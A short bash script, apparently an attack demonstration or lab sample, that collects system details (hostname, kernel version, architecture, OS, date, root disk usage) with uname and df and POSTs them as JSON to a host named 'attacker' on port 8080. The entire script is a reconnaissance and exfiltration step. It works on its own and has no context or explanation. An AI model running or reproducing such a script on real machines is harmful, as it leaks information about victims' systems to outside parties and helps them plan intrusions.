#!/usr/bin/env bash
kernel_release=$(uname -r)
kernel_name=$(uname -s)
host_name=$(uname -n)
kernel_version=$(uname -v)
machine=$(uname -m)
processor=$(uname -p)
hw_platform=$(uname -i)
os=$(uname -o)
date=$(date)
used_space=$(df -h | awk 'NR>1 && $6=="/" {print $3}')

curl -X 'POST' \
    'attacker:8080/info' \
    -H 'accept: */*' \
    -H 'Content-Type: application/json' \
    -d "{
  \"os\": \"$os\",
  \"kernelName\": \"$kernel_name\",
  \"hostName\": \"$host_name\",
  \"kernelRelease\": \"$kernel_release\",
  \"kernelVersion\": \"$kernel_version\",
  \"machine\": \"$machine\",
  \"processor\": \"$processor\",
  \"kernelVersion\": \"$kernel_version\",
  \"hwPlatform\": \"$hw_platform\",
  \"usedSpace\": \"$used_space\",
  \"dateTime\": \"$date\"
}"
